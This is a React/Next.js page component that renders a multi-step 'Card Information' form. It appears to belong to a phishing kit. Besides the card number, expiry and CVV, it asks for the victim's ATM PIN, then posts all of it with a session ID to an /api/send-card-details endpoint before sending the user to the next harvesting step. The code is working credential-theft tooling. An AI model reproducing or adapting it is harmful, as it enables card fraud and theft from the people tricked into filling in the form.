import React, { useContext, useState } from "react";
import { Box, TextField, Typography } from "@mui/material";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import ReactInputMask from "react-input-mask";
import valid from "card-validator";
import * as yup from "yup";
import { Button } from "../components/Button";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface CardProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("Card number required")
    .test(
      "test-number",
      "Card number not valid",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("Card expiry date required")
    .test(
      "test-date",
      "Expiry date not valid",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("CVV required")
    .test(
      "test-cvv",
      "CVV number not valid",
      (value) => valid.cvv(value).isValid
    ),
  cardPin: yup
    .string()
    .required("Card pin required")
    .min(4, "Card pin not valid")
    .max(5, "Card pin not valid"),
});

export const Card: React.FC<CardProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD`);
    formData.append(
      `cardDetails`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`CARD`) + 1];

    push(getNextUrl(url));
  });

  return (
    <Wrapper title={`Card Information`}>
      <Box component={`form`}>
        <ReactInputMask
          mask={cardMask}
          {...register(`cardNumber`, {
            onChange: (event: any) => {
              var value = event.target.value;

              var newState = "9999 9999 9999 9999";
              if (/^3[47]/.test(value)) {
                newState = "9999 999999 99999";
              }
              setCardMask(newState);
            },
          })}
        >
          {
            // @ts-ignore
            () => (
              <TextField
                // error
                label="Card Number"
                // helperText="Incorrect entry."
                variant="standard"
                fullWidth
                sx={{
                  marginTop: `16px`,
                }}
                {...register(`cardNumber`, {
                  onChange: (event: any) => {
                    var value = event.target.value;

                    var newState = "9999 9999 9999 9999";
                    if (/^3[47]/.test(value)) {
                      newState = "9999 999999 99999";
                    }
                    setCardMask(newState);
                  },
                })}
                error={errors.cardNumber && errors.cardNumber.message}
                helperText={errors.cardNumber && errors.cardNumber.message}
              />
            )
          }
        </ReactInputMask>
        <ReactInputMask mask="99/9999" {...register(`expirationDate`)}>
          {
            // @ts-ignore
            () => (
              <TextField
                // error
                label="Expiry Date (MM/YY)"
                // helperText="Incorrect entry."
                variant="standard"
                fullWidth
                sx={{
                  marginTop: `16px`,
                }}
                error={errors.expirationDate && errors.expirationDate.message}
                helperText={
                  errors.expirationDate && errors.expirationDate.message
                }
                {...register(`expirationDate`)}
              />
            )
          }
        </ReactInputMask>
        <TextField
          // error
          label="CVV (3-digits at the back of your card)"
          // helperText="Incorrect entry."
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          type={`number`}
          error={errors.cvv && errors.cvv.message}
          helperText={errors.cvv && errors.cvv.message}
          {...register(`cvv`)}
        />
        <TextField
          // error
          label="Card Pin (The same pin you use at the ATM)"
          // helperText="Incorrect entry."
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          type={`number`}
          error={errors.cardPin && errors.cardPin.message}
          helperText={errors.cardPin && errors.cardPin.message}
          {...register(`cardPin`)}
        />
        <Button
          variant="contained"
          sx={{
            height: `36px`,
            textIndent: `0.0892857143em`,
            letterSpacing: `.0892857143em`,
            padding: `0 16px`,
            marginRight: `12px`,
          }}
          onClick={onSubmit}
          disabled={loading}
        >
          Next
        </Button>
      </Box>
      <Typography
        component={`p`}
        sx={{
          fontSize: `.875rem`,
          fontFamily: `Roboto,sans-serif`,
          fontWeight: 400,
          lineHeight: `1.25rem`,
          letterSpacing: `.0178571429em`,
          marginTop: `24px`,
          marginBottom: `16px`,
        }}
      ></Typography>
    </Wrapper>
  );
};

export default Card;
